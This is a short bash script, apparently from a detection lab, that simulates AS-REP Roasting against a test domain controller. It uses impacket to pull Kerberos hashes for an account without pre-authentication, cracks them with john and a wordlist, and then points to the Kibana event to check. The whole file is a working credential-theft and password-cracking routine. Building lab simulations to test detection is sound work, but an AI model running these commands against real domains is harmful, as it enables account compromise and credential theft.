#!/bin/bash
# Attack Simulation: AS-REP Roasting
# MITRE ATT&CK: T1558.004
# Usage: ./asrep_roasting.sh
# Requirements: impacket installed on Kali

DC_IP="192.168.50.86"
DOMAIN="lab.local"
USERNAME="jsmith"

echo "[*] Syncing time with DC..."
sudo ntpdate $DC_IP

echo "[*] Executing AS-REP Roasting attack against $DC_IP"
impacket-GetNPUsers ${DOMAIN}/${USERNAME} -dc-ip $DC_IP -no-pass -outputfile /tmp/asrep_hashes.txt

echo "[*] Attempting to crack hashes..."
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/asrep_hashes.txt

echo "[*] Attack complete - check Kibana for Event ID 4768 with PreAuthType 0"
